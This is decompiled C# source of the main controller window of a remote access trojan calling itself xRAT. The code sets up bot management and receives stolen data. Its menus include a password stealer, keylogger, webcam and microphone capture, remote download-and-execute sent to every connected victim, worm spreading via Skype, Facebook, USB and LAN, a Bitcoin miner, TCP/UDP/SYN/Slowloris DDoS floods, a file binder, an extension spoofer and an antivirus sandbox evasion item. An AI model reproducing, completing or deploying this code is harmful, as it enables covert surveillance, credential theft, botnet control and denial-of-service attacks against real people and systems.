        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void ExitToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void ExtensionChangerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Interaction.Shell(@"data\Spoofer.exe", AppWinStyle.MinimizedFocus, false, -1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void FileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                Class2.Class4_0.method_3().ShowDialog();
            }
        }

        private void FixMouseButtonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("DSWAPMOUSEBUTTON");
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                this.inisettings.UpdateSingleSetting("PORT", Conversions.ToString(this.port), true);
                this.inisettings.UpdateSingleSetting("PASSWORD", this.password, true);
                this.inisettings.UpdateSingleSetting("POPUPNOTIFY", Conversions.ToString(this.popupnotify), true);
                this.inisettings.UpdateSingleSetting("AUTOREFRESHINT", Conversions.ToString(this.autorefreshInt), true);
                this.inisettings.UpdateSingleSetting("AUTOREFRESHENABLED", Conversions.ToString(this.autorefreshact), true);
                this.inisettings.UpdateSingleSetting("AUTOSIZECOL", Conversions.ToString(this.autosize), true);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Interaction.MsgBox("Access denied for path:\r\n" + Application.StartupPath, MsgBoxStyle.Exclamation, null);
                ProjectData.ClearProjectError();
            }
            if (e.CloseReason != CloseReason.ApplicationExitCall)
            {
                this.Hide();
                this.NotifyIcon1.ShowBalloonTip(15, "Running in background", "xRAT is now running in background.", ToolTipIcon.Info);
                e.Cancel = true;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            bool flag;
            try
            {
                WebClient client;
                string str = string.Empty;
                ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
                using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
                {
                    ManagementObject current;
                    while (enumerator.MoveNext())
                    {
                        current = (ManagementObject) enumerator.Current;
                        if (str == "")
                        {
                            goto Label_004A;
                        }
                    }
                    goto Label_0072;
                Label_004A:
                    str = current.Properties["processorID"].Value.ToString();
                }
            Label_0072:
                client = new WebClient();
                string str2 = client.DownloadString(this.Decrypt("hwodpkiow41qd", "1F1B1000514640075C4113064601000D1C0A470112401E1B0D03591B1C04"));
                client.Dispose();
                if (!str2.Contains(str))
                {
                    Application.Exit();
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            Point point = new Point(0x3ba, 350);
            this.MinimumSize = (Size) point;
            this.mutex_0 = new Mutex(false, "xRAT-2186192612", out flag);
            if (!flag)
            {
                MessageBox.Show("Application is already running.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                Application.Exit();
            }
            if (!System.IO.File.Exists(Application.StartupPath + @"\data\GeoIP.dat"))
            {
                Interaction.MsgBox("Can't find \"" + Application.StartupPath + "\\data\\GeoIP.dat\"", MsgBoxStyle.Exclamation, null);
                Application.Exit();
            }
            if (System.IO.File.Exists(Application.StartupPath + @"\settings.ini"))
            {
                this.port = Conversions.ToInteger(this.inisettings.LoadSetting("PORT", false));
                this.password = this.inisettings.LoadSetting("PASSWORD", false);
                this.popupnotify = Conversions.ToInteger(this.inisettings.LoadSetting("POPUPNOTIFY", false));
                this.autorefreshInt = Conversions.ToInteger(this.inisettings.LoadSetting("AUTOREFRESHINT", false));
                this.autorefreshact = Conversions.ToInteger(this.inisettings.LoadSetting("AUTOREFRESHENABLED", false));
                this.autosize = Conversions.ToInteger(this.inisettings.LoadSetting("AUTOSIZECOL", false));
            }
            else
            {
                try
                {
                    this.inisettings.AddSetting("PORT", Conversions.ToString(0x1b60));
                    this.inisettings.AddSetting("PASSWORD", "passwd");
                    this.inisettings.AddSetting("POPUPNOTIFY", Conversions.ToString(1));
                    this.inisettings.AddSetting("AUTOREFRESHINT", Conversions.ToString(60));
                    this.inisettings.AddSetting("AUTOREFRESHENABLED", Conversions.ToString(1));
                    this.inisettings.AddSetting("AUTOSIZECOL", Conversions.ToString(1));
                    this.inisettings.SaveAllSettings(false);
                    this.port = 0x1b60;
                    this.password = "passwd";
                    this.popupnotify = 1;
                    this.autorefreshInt = 60;
                    this.autorefreshact = 1;
                    this.autosize = 1;
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    Interaction.MsgBox("Access denied for path:\r\n" + Application.StartupPath, MsgBoxStyle.Exclamation, null);
                    ProjectData.ClearProjectError();
                }
            }
            if (this.autorefreshact == 1)
            {
                this.Timer1.Interval = this.autorefreshInt * 0x3e8;
                this.Timer1.Enabled = true;
            }
        }

        private void Form1_SizeChanged(object sender, EventArgs e)
        {
            this.Refresh();
        }

        private void FormGrabberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Class2.Class4_0.method_9().Show();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void GetIPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Class2.Class4_0.method_11().Show();
        }

        public object GetPingMs(ref string hostNameOrAddress)
        {
            object obj2;
            Ping ping = new Ping();
            try
            {
                PingReply reply = ping.Send(hostNameOrAddress);
                long roundtripTime = reply.RoundtripTime;
                if (reply.Status == IPStatus.Success)
                {
                    if (Conversions.ToDouble(roundtripTime.ToString()) == 0.0)
                    {
                        return (Conversions.ToString(1) + " ms");
                    }
                    return (roundtripTime.ToString() + " ms");
                }
                obj2 = "> 200 ms";
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                obj2 = "Dead";
                ProjectData.ClearProjectError();
            }
            return obj2;
        }

        private void GetRecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("MICRODOWN");
            }
        }

        public void GetSysInfo(string os, string cpu, string cores, string videocard, string windir, string ram, string isAdmin)
        {
            Class2.Class4_0.method_24().TextBox1.Text = os;
            Class2.Class4_0.method_24().TextBox2.Text = cpu;
            Class2.Class4_0.method_24().TextBox3.Text = cores;
            Class2.Class4_0.method_24().TextBox4.Text = videocard;
            Class2.Class4_0.method_24().TextBox5.Text = windir;
            Class2.Class4_0.method_24().TextBox6.Text = ram;
            Class2.Class4_0.method_24().TextBox7.Text = isAdmin;
            Class2.Class4_0.method_24().Label7.Visible = false;
            Class2.Class4_0.method_24().PictureBox1.Visible = false;
        }

        public void GotInfo(xRAT.Connection client, string Msg)
        {
            try
            {
                string[] strArray = Msg.Split(new char[] { '|' });
                switch (strArray[0])
                {
                    case "CONNECTED":
                        if (Conversions.ToDouble(this.ToolStripTextBox14.Text) != this.int_0)
                        {
                            if (this.Decrypt("Secr2t-pizza-homerPWD24", strArray[7]) == this.password)
                            {
                                string str3 = Conversions.ToString(this.GetPingMs(ref Conversions.ToString(client.Object_0)));
                                string[] strArray2 = strArray[3].Split(new char[] { '\\' });
                                this.Invoke(new AddDelegate(this.AddClient), new object[] { client, new string[] { Conversions.ToString(client.Object_0), strArray[1], strArray[2], strArray2[0], strArray2[1], strArray[4], strArray[5], Conversions.ToString(this.LookUpDetails(Conversions.ToString(client.Object_0))), str3, strArray[6] } });
                            }
                            bool flag1 = Class2.Class4_0.method_21().CheckBox4.Checked;
                            if (this.ComboBox1.Text == "Download & Execute")
                            {
                                try
                                {
                                    this.SendToAll("DL|" + this.TextBox2.Text);
                                }
                                catch (Exception exception1)
                                {
                                    ProjectData.SetProjectError(exception1);
                                    ProjectData.ClearProjectError();
                                }
                            }
                        }
                        return;

                    case "STATUS":
                        this.Invoke(new UpdateStatusDelegate(this.UpdateStatus), new object[] { client, strArray[1] });
                        return;

                    case "STATUSFM":
                        this.Invoke(new UpdateStatusFilemanagerDelegate(this.UpdateStatusFilemanager), new object[] { strArray[1] });
                        return;

                    case "SYSINFO":
                        this.Invoke(new DelegateGetSysInfo(this.GetSysInfo), new object[] { strArray[1], strArray[2], strArray[3], strArray[4], strArray[5], strArray[6], strArray[7] });
                        return;

                    case "REMOTEDESK":
                    {
                        string s = strArray[1];
                        byte[] byAr = Convert.FromBase64String(s);
                        int num = (int) Math.Round((double) (((double) byAr.Length) / 1024.0));
                        Image image = this.ByteArray2Image(byAr);
                        this.Invoke(new DelegateRemoteDesk(this.RemoteDesk), new object[] { image, num });
                        return;
                    }
                    case "CHAT":
                        this.Invoke(new DelDisplayMessage(this.DisplayMessage), new object[] { strArray[1] });
                        return;

                    case "STealerRecu":
                        this.RichTextBox2.Text = "";
                        this.RichTextBox2.AppendText(strArray[1]);
                        return;

                    case "SENDLOG":
                        this.RichTextBox3.Text = "";
                        this.RichTextBox3.AppendText(strArray[1]);
                        return;

                    case "PRCLIST":
                    {
                        string str5 = null;
                        foreach (string str6 in strArray)
                        {
                            if ((str6 != "PRCLIST") && (str6 != null))
                            {
                                str5 = str5 + str6 + "|";
                            }
                        }
                        str5 = str5.Remove(str5.Length - 1);
                        this.Invoke(new PrcListDelegate(this.PrcList), new object[] { str5 });
                        return;
                    }
                    case "DIR":
                        this.Invoke(new DirDelegate(this.Dirfile), new object[] { strArray[1], strArray[2], strArray[3] });
                        return;

                    case "DRIVES":
                        this.Invoke(new DelDrives(this.Drives), new object[] { strArray[1] });
                        break;

                    case "SENDFILE":
                        this.Invoke(new DelSaveDownloadedFile(this.SaveDownloadedFile), new object[] { client, Convert.FromBase64String(strArray[1]), strArray[2] });
                        this.Invoke(new UpdateStatusFilemanagerDelegate(this.UpdateStatusFilemanager), new object[] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("File downloaded and saved to \"Users\\", client.Object_0), @"\"), strArray[2]), "\"") });
                        break;
                }
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
        }

        private void HideTaskbarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lstClients.SelectedItems.Count > 0)
            {
                this.SendToSelected("Cachelabarre");
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.icontainer_0 = new System.ComponentModel.Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(Form1));
            this.ContextMenuStrip1 = new ContextMenuStrip(this.icontainer_0);
            this.ListenToolStripMenuItem = new ToolStripMenuItem();
            this.StopToolStripMenuItem = new ToolStripMenuItem();
            this.RefreshToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripMenuItem1 = new ToolStripSeparator();
            this.ShowSystemInformationToolStripMenuItem = new ToolStripMenuItem();
            this.ViewRemoteDesktopToolStripMenuItem = new ToolStripMenuItem();
            this.WebcamToolStripMenuItem = new ToolStripMenuItem();
            this.FunStuffToolStripMenuItem = new ToolStripMenuItem();
            this.OpenCDToolStripMenuItem = new ToolStripMenuItem();
            this.CloseCDToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator1 = new ToolStripSeparator();
            this.SpeakComputerToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox1 = new ToolStripTextBox();
            this.OkToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator2 = new ToolStripSeparator();
            this.PlayMusicToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox6 = new ToolStripTextBox();
            this.OkToolStripMenuItem5 = new ToolStripMenuItem();
            this.ToolStripSeparator4 = new ToolStripSeparator();
            this.MessageBoxToolStripMenuItem1 = new ToolStripMenuItem();
            this.ToolStripSeparator13 = new ToolStripSeparator();
            this.HideTaskbarToolStripMenuItem = new ToolStripMenuItem();
            this.ShowTaskbarToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator3 = new ToolStripSeparator();
            this.MsnControlToolStripMenuItem = new ToolStripMenuItem();
            this.FreezeToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox3 = new ToolStripTextBox();
            this.OkToolStripMenuItem2 = new ToolStripMenuItem();
            this.UnfreezeToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox4 = new ToolStripTextBox();
            this.OkToolStripMenuItem3 = new ToolStripMenuItem();
            this.ToolStripSeparator6 = new ToolStripSeparator();
            this.BipSoundToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator8 = new ToolStripSeparator();
            this.RandomIconDesktopToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator10 = new ToolStripSeparator();
            this.RandomCursorToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator11 = new ToolStripSeparator();
            this.BSODToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator9 = new ToolStripSeparator();
            this.SwapMouseButtonToolStripMenuItem = new ToolStripMenuItem();
            this.FixMouseButtonToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator12 = new ToolStripSeparator();
            this.MatrixScreenToolStripMenuItem = new ToolStripMenuItem();
            this.ProcessesToolStripMenuItem = new ToolStripMenuItem();
            this.ListToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem3 = new ToolStripMenuItem();
            this.KillToolStripMenuItem = new ToolStripMenuItem();
            this.RecordAudioToolStripMenuItem = new ToolStripMenuItem();
            this.RecordToolStripMenuItem = new ToolStripMenuItem();
            this.StopRecordToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator5 = new ToolStripSeparator();
            this.GetRecordToolStripMenuItem = new ToolStripMenuItem();
            this.ComputerToolStripMenuItem = new ToolStripMenuItem();
            this.RestartToolStripMenuItem = new ToolStripMenuItem();
            this.ShutdownToolStripMenuItem = new ToolStripMenuItem();
            this.EnableMouseAndKeyboardToolStripMenuItem = new ToolStripMenuItem();
            this.DisableMouseAndKeyboardToolStripMenuItem = new ToolStripMenuItem();
            this.ClearTraceHistoryToolStripMenuItem = new ToolStripMenuItem();
            this.StealerToolStripMenuItem = new ToolStripMenuItem();
            this.RemoteFileManagerToolStripMenuItem = new ToolStripMenuItem();
            this.KeyloggzeToolStripMenuItem = new ToolStripMenuItem();
            this.OpenWebsiteToolStripMenuItem = new ToolStripMenuItem();
            this.VisitWebsiteToolStripMenuItem = new ToolStripMenuItem();
            this.RemoteDownloadExecuteToolStripMenuItem = new ToolStripMenuItem();
            this.FileManagerToolStripMenuItem = new ToolStripMenuItem();
            this.SpreadToolStripMenuItem = new ToolStripMenuItem();
            this.SkypeToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox2 = new ToolStripTextBox();
            this.OkToolStripMenuItem1 = new ToolStripMenuItem();
            this.FacebookToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox13 = new ToolStripTextBox();
            this.OkToolStripMenuItem7 = new ToolStripMenuItem();
            this.UsbToolStripMenuItem = new ToolStripMenuItem();
            this.LanToolStripMenuItem = new ToolStripMenuItem();
            this.HideShowColumsToolStripMenuItem = new ToolStripMenuItem();
            this.IPAdressToolStripMenuItem = new ToolStripMenuItem();
            this.VersionToolStripMenuItem = new ToolStripMenuItem();
            this.StatusToolStripMenuItem = new ToolStripMenuItem();
            this.ComputerNameToolStripMenuItem = new ToolStripMenuItem();
            this.UsernameToolStripMenuItem = new ToolStripMenuItem();
            this.WindowsKeyToolStripMenuItem = new ToolStripMenuItem();
            this.OSToolStripMenuItem = new ToolStripMenuItem();
            this.CountryToolStripMenuItem = new ToolStripMenuItem();
            this.PingToolStripMenuItem = new ToolStripMenuItem();
            this.Sock5ToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox7 = new ToolStripTextBox();
            this.OkToolStripMenuItem6 = new ToolStripMenuItem();
            this.TracerouteIPToolStripMenuItem = new ToolStripMenuItem();
            this.BotkillToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem2 = new ToolStripMenuItem();
            this.StopToolStripMenuItem2 = new ToolStripMenuItem();
            this.BitCoinMinerToolStripMenuItem = new ToolStripMenuItem();
            this.DDOSToolStripMenuItem = new ToolStripMenuItem();
            this.TCPToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem1 = new ToolStripMenuItem();
            this.ToolStripTextBox9 = new ToolStripTextBox();
            this.ToolStripTextBox10 = new ToolStripTextBox();
            this.ToolStripTextBox11 = new ToolStripTextBox();
            this.AttackToolStripMenuItem = new ToolStripMenuItem();
            this.StopToolStripMenuItem1 = new ToolStripMenuItem();
            this.UDPToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem5 = new ToolStripMenuItem();
            this.StopToolStripMenuItem6 = new ToolStripMenuItem();
            this.SUDPToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox5 = new ToolStripTextBox();
            this.ToolStripTextBox12 = new ToolStripTextBox();
            this.OkToolStripMenuItem4 = new ToolStripMenuItem();
            this.SSYNToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem6 = new ToolStripMenuItem();
            this.StopToolStripMenuItem5 = new ToolStripMenuItem();
            this.SlowlorisToolStripMenuItem = new ToolStripMenuItem();
            this.StartToolStripMenuItem4 = new ToolStripMenuItem();
            this.StopToolStripMenuItem4 = new ToolStripMenuItem();
            this.EToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripTextBox8 = new ToolStripTextBox();
            this.StartToolStripMenuItem = new ToolStripMenuItem();
            this.GetIPToolStripMenuItem = new ToolStripMenuItem();
            this.ServerToolStripMenuItem = new ToolStripMenuItem();
            this.RestartToolStripMenuItem1 = new ToolStripMenuItem();
            this.CloseToolStripMenuItem = new ToolStripMenuItem();
            this.ImageList1 = new ImageList(this.icontainer_0);
            this.MenuStrip1 = new MenuStrip();
            this.ToolStripMenuItem2 = new ToolStripMenuItem();
            this.FileToolStripMenuItem = new ToolStripMenuItem();
            this.SettingsToolStripMenuItem = new ToolStripMenuItem();
            this.NoipUpdateToolStripMenuItem = new ToolStripMenuItem();
            this.ExitToolStripMenuItem = new ToolStripMenuItem();
            this.ServerEditorToolStripMenuItem = new ToolStripMenuItem();
            this.BinderToolStripMenuItem = new ToolStripMenuItem();
            this.FormGrabberToolStripMenuItem = new ToolStripMenuItem();
            this.ExtraToolStripMenuItem = new ToolStripMenuItem();
            this.PortScannerToolStripMenuItem = new ToolStripMenuItem();
            this.ResHackerToolStripMenuItem = new ToolStripMenuItem();
            this.ExtensionChangerToolStripMenuItem = new ToolStripMenuItem();
            this.BinderToolStripMenuItem1 = new ToolStripMenuItem();
            this.AntiAvastSandBoxToolStripMenuItem = new ToolStripMenuItem();
            this.txtListening = new ToolStripStatusLabel();
            this.ToolStripStatusLabel1 = new ToolStripStatusLabel();
            this.StatusStrip1 = new StatusStrip();
            this.txtOnline = new ToolStripStatusLabel();
            this.ToolStripSplitButton1 = new ToolStripSplitButton();
            this.NumberOfConnectionsMaxToolStripMenuItem = new ToolStripMenuItem();
            this.ToolStripSeparator7 = new ToolStripSeparator();
            this.ToolStripTextBox14 = new ToolStripTextBox();
            this.ToolStripStatusLabel2 = new ToolStripStatusLabel();
            this.ContextMenuStrip2 = new ContextMenuStrip(this.icontainer_0);
            this.SaveToFileToolStripMenuItem = new ToolStripMenuItem();
            this.NotifyIcon1 = new NotifyIcon(this.icontainer_0);
            this.ContextMenuStrip3 = new ContextMenuStrip(this.icontainer_0);
            this.ShowToolStripMenuItem = new ToolStripMenuItem();
            this.ExitToolStripMenuItem1 = new ToolStripMenuItem();
            this.Timer1 = new System.Windows.Forms.Timer(this.icontainer_0);
            this.getloggg = new TextBox();
            this.textsteam = new TextBox();
            this.RichTextBox3 = new RichTextBox();
            this.RichTextBox4 = new RichTextBox();
            this.SideTab1 = new Control0();
            this.TabPage1 = new TabPage();
            this.RichTextBox2 = new RichTextBox();
            this.lstClients = new ListView();
            this.lstipaddress = new ColumnHeader();
            this.lstversion = new ColumnHeader();
            this.lststatus = new ColumnHeader();
            this.lstcpname = new ColumnHeader();
            this.lstusername = new ColumnHeader();
            this.lstwinprckey = new ColumnHeader();
            this.lstopsys = new ColumnHeader();
            this.lstcountry = new ColumnHeader();
            this.lstping = new ColumnHeader();
            this.TabPage2 = new TabPage();
            this.ListView1 = new ListView();
            this.ColumnHeader7 = new ColumnHeader();
            this.ColumnHeader8 = new ColumnHeader();
            this.TabPage4 = new TabPage();
            this.Win8Progressbar1 = new Win8Progressbar();
            this.Button1 = new Button();
            this.CheckBox1 = new CheckBox();
            this.Label2 = new Label();
            this.TextBox1 = new TextBox();
            this.PictureBox1 = new PictureBox();
            this.TabPage5 = new TabPage();
            this.Button2 = new Button();
            this.TextBox2 = new TextBox();
            this.ComboBox1 = new ComboBox();
            this.TabPage3 = new TabPage();
            this.ContextMenuStrip1.SuspendLayout();
            this.MenuStrip1.SuspendLayout();
            this.StatusStrip1.SuspendLayout();
            this.ContextMenuStrip2.SuspendLayout();
            this.ContextMenuStrip3.SuspendLayout();
            this.SideTab1.SuspendLayout();
            this.TabPage1.SuspendLayout();
            this.TabPage2.SuspendLayout();
            this.TabPage4.SuspendLayout();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.TabPage5.SuspendLayout();
            this.SuspendLayout();
            this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[] { 
                this.ListenToolStripMenuItem, this.StopToolStripMenuItem, this.RefreshToolStripMenuItem, this.ToolStripMenuItem1, this.ShowSystemInformationToolStripMenuItem, this.ViewRemoteDesktopToolStripMenuItem, this.WebcamToolStripMenuItem, this.FunStuffToolStripMenuItem, this.ProcessesToolStripMenuItem, this.RecordAudioToolStripMenuItem, this.ComputerToolStripMenuItem, this.StealerToolStripMenuItem, this.RemoteFileManagerToolStripMenuItem, this.KeyloggzeToolStripMenuItem, this.OpenWebsiteToolStripMenuItem, this.VisitWebsiteToolStripMenuItem, 
                this.RemoteDownloadExecuteToolStripMenuItem, this.FileManagerToolStripMenuItem, this.SpreadToolStripMenuItem, this.HideShowColumsToolStripMenuItem, this.Sock5ToolStripMenuItem, this.TracerouteIPToolStripMenuItem, this.BotkillToolStripMenuItem, this.BitCoinMinerToolStripMenuItem, this.DDOSToolStripMenuItem, this.ServerToolStripMenuItem
             });
            this.ContextMenuStrip1.Name = "ContextMenuStrip1";
            this.ContextMenuStrip1.RenderMode = ToolStripRenderMode.Professional;
            Size size = new Size(0xce, 560);
            this.ContextMenuStrip1.Size = size;
            this.ListenToolStripMenuItem.Image = (Image) manager.GetObject("ListenToolStripMenuItem.Image");
            this.ListenToolStripMenuItem.Name = "ListenToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ListenToolStripMenuItem.Size = size;
            this.ListenToolStripMenuItem.Text = "Listen";
            this.StopToolStripMenuItem.Image = (Image) manager.GetObject("StopToolStripMenuItem.Image");
            this.StopToolStripMenuItem.Name = "StopToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.StopToolStripMenuItem.Size = size;
            this.StopToolStripMenuItem.Text = "Stop";
            this.RefreshToolStripMenuItem.Image = (Image) manager.GetObject("RefreshToolStripMenuItem.Image");
            this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.RefreshToolStripMenuItem.Size = size;
            this.RefreshToolStripMenuItem.Text = "Refresh";
            this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
            size = new Size(0xca, 6);
            this.ToolStripMenuItem1.Size = size;
            this.ShowSystemInformationToolStripMenuItem.Image = (Image) manager.GetObject("ShowSystemInformationToolStripMenuItem.Image");
            this.ShowSystemInformationToolStripMenuItem.Name = "ShowSystemInformationToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ShowSystemInformationToolStripMenuItem.Size = size;
            this.ShowSystemInformationToolStripMenuItem.Text = "System Information";
            this.ViewRemoteDesktopToolStripMenuItem.Image = (Image) manager.GetObject("ViewRemoteDesktopToolStripMenuItem.Image");
            this.ViewRemoteDesktopToolStripMenuItem.Name = "ViewRemoteDesktopToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.ViewRemoteDesktopToolStripMenuItem.Size = size;
            this.ViewRemoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.WebcamToolStripMenuItem.Image = Class5.smethod_91();
            this.WebcamToolStripMenuItem.Name = "WebcamToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.WebcamToolStripMenuItem.Size = size;
            this.WebcamToolStripMenuItem.Text = "Webcam";
            this.FunStuffToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { 
                this.OpenCDToolStripMenuItem, this.CloseCDToolStripMenuItem, this.ToolStripSeparator1, this.SpeakComputerToolStripMenuItem, this.ToolStripSeparator2, this.PlayMusicToolStripMenuItem, this.ToolStripSeparator4, this.MessageBoxToolStripMenuItem1, this.ToolStripSeparator13, this.HideTaskbarToolStripMenuItem, this.ShowTaskbarToolStripMenuItem, this.ToolStripSeparator3, this.MsnControlToolStripMenuItem, this.ToolStripSeparator6, this.BipSoundToolStripMenuItem, this.ToolStripSeparator8, 
                this.RandomIconDesktopToolStripMenuItem, this.ToolStripSeparator10, this.RandomCursorToolStripMenuItem, this.ToolStripSeparator11, this.BSODToolStripMenuItem, this.ToolStripSeparator9, this.SwapMouseButtonToolStripMenuItem, this.FixMouseButtonToolStripMenuItem, this.ToolStripSeparator12, this.MatrixScreenToolStripMenuItem
             });
            this.FunStuffToolStripMenuItem.Image = (Image) manager.GetObject("FunStuffToolStripMenuItem.Image");
            this.FunStuffToolStripMenuItem.Name = "FunStuffToolStripMenuItem";
            size = new Size(0xcd, 0x16);
            this.FunStuffToolStripMenuItem.Size = size;
            this.FunStuffToolStripMenuItem.Text = "Fun Stuff";
            this.OpenCDToolStripMenuItem.Image = (Image) manager.GetObject("OpenCDToolStripMenuItem.Image");
            this.OpenCDToolStripMenuItem.Name = "OpenCDToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.OpenCDToolStripMenuItem.Size = size;
            this.OpenCDToolStripMenuItem.Text = "Open DVD";
            this.CloseCDToolStripMenuItem.Image = (Image) manager.GetObject("CloseCDToolStripMenuItem.Image");
            this.CloseCDToolStripMenuItem.Name = "CloseCDToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.CloseCDToolStripMenuItem.Size = size;
            this.CloseCDToolStripMenuItem.Text = "Close DVD";
            this.ToolStripSeparator1.Name = "ToolStripSeparator1";
            size = new Size(0xad, 6);
            this.ToolStripSeparator1.Size = size;
            this.SpeakComputerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox1, this.OkToolStripMenuItem });
            this.SpeakComputerToolStripMenuItem.Image = (Image) manager.GetObject("SpeakComputerToolStripMenuItem.Image");
            this.SpeakComputerToolStripMenuItem.Name = "SpeakComputerToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.SpeakComputerToolStripMenuItem.Size = size;
            this.SpeakComputerToolStripMenuItem.Text = "Speak Computer";
            this.ToolStripTextBox1.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox1.Name = "ToolStripTextBox1";
            size = new Size(100, 0x15);
            this.ToolStripTextBox1.Size = size;
            this.ToolStripTextBox1.Text = "You Fail ! ";
            this.OkToolStripMenuItem.Image = Class5.smethod_7();
            this.OkToolStripMenuItem.Name = "OkToolStripMenuItem";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem.Size = size;
            this.OkToolStripMenuItem.Text = ":: Ok ::";
            this.ToolStripSeparator2.Name = "ToolStripSeparator2";
            size = new Size(0xad, 6);
            this.ToolStripSeparator2.Size = size;
            this.PlayMusicToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.ToolStripTextBox6, this.OkToolStripMenuItem5 });
            this.PlayMusicToolStripMenuItem.Image = Class5.smethod_57();
            this.PlayMusicToolStripMenuItem.Name = "PlayMusicToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.PlayMusicToolStripMenuItem.Size = size;
            this.PlayMusicToolStripMenuItem.Text = "Play Music";
            this.ToolStripTextBox6.Font = new Font("Tahoma", 8.25f);
            this.ToolStripTextBox6.Name = "ToolStripTextBox6";
            size = new Size(100, 0x15);
            this.ToolStripTextBox6.Size = size;
            this.ToolStripTextBox6.Text = "http://www.site.com/try.wav";
            this.OkToolStripMenuItem5.Image = Class5.smethod_7();
            this.OkToolStripMenuItem5.Name = "OkToolStripMenuItem5";
            size = new Size(160, 0x16);
            this.OkToolStripMenuItem5.Size = size;
            this.OkToolStripMenuItem5.Text = ":: Ok ::";
            this.ToolStripSeparator4.Name = "ToolStripSeparator4";
            size = new Size(0xad, 6);
            this.ToolStripSeparator4.Size = size;
            this.MessageBoxToolStripMenuItem1.Image = Class5.smethod_26();
            this.MessageBoxToolStripMenuItem1.Name = "MessageBoxToolStripMenuItem1";
            size = new Size(0xb0, 0x16);
            this.MessageBoxToolStripMenuItem1.Size = size;
            this.MessageBoxToolStripMenuItem1.Text = "Message Box";
            this.ToolStripSeparator13.Name = "ToolStripSeparator13";
            size = new Size(0xad, 6);
            this.ToolStripSeparator13.Size = size;
            this.HideTaskbarToolStripMenuItem.Image = Class5.smethod_38();
            this.HideTaskbarToolStripMenuItem.Name = "HideTaskbarToolStripMenuItem";
            size = new Size(0xb0, 0x16);
            this.HideTaskbarToolStripMenuItem.Size = size;
            this.HideTaskbarToolStripMenuItem.Text = "Hide Taskbar";
            this.ShowTaskbarToolStripMenuItem.Image = (Image) manager.GetObject("ShowTaskbarToolStripMenuItem.Image");
